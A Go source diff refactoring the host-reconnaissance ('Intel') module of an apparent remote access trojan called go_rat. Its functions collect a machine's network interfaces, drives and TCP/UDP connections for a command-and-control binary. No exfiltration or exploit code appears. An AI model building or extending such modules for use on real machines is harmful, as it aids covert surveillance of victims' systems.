@@ -15,7 +15,6 @@ package Intel
 // import the libraries we need
 import (
 	"go_rat/pkg/shared_code/Core"
-	shared_code "go_rat/pkg/shared_code/Core"
 	"go_rat/pkg/shared_code/ErrorHandling"
 	"net"
 
@@ -34,7 +33,7 @@ That calls the others depending on the request from the
 Command and Control binary
 */
 //This is available outside the module because it is capitalized
-func GatherIntel(intel_container *shared_code.HostIntel) *shared_code.HostIntel {
+func GatherIntel(intel_container *Core.HostIntel) *Core.HostIntel {
 	// maybe you could add some logic to control this thing?
 
 	//## Contintued from the NewHostIntel() Function declaration
@@ -48,13 +47,12 @@ func GatherIntel(intel_container *shared_code.HostIntel) *shared_code.HostIntel 
 }
 
 // this is not available outside the module because it is NOT capitalized
-func get_interfaces(intel_struct *shared_code.HostIntel) bool {
-	// error check everything!
-	// return true or false depending on error
+func get_interfaces(intel_struct *Core.HostIntel) bool {
+	// return true or false depending on error, just because
 	// Get all network interfaces
 	herp, derp := net.Interfaces()
 	if derp != nil {
-		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
+		ErrorHandling.RatLogError(derp, "generic error, fix me plz lol <3!")
 		return false
 	}
 	intel_struct.Interfaces = herp
@@ -68,7 +66,7 @@ func get_interfaces(intel_struct *shared_code.HostIntel) bool {
 func GetDrives(intel_struct *Core.HostIntel) bool {
 	herp, derp := disk.Partitions(true)
 	if derp != nil {
-		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
+		ErrorHandling.RatLogError(derp, "generic error, fix me plz lol <3!")
 		return false
 	}
 	intel_struct.DriveInformation = herp
@@ -83,7 +81,7 @@ func GetTCPConnections(intel_struct *Core.HostIntel) bool {
 	// TCP sockets
 	herp, derp := netstat.TCPSocks(netstat.NoopFilter)
 	if derp != nil {
-		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
+		ErrorHandling.RatLogError(derp, "generic error, fix me plz lol <3!")
 		return false
 	}
 	intel_struct.TCPConnections = herp
@@ -95,7 +93,7 @@ func GetUDPConnections(intel_struct *Core.HostIntel) bool {
 	// UDP sockets
 	herp, derp := netstat.UDPSocks(netstat.NoopFilter)
 	if derp != nil {
-		ErrorHandling.Error_printer(derp, "generic error, fix me plz lol <3!")
+		ErrorHandling.RatLogError(derp, "generic error, fix me plz lol <3!")
 		return false
 	}
 	intel_struct.UDPConnections = herp
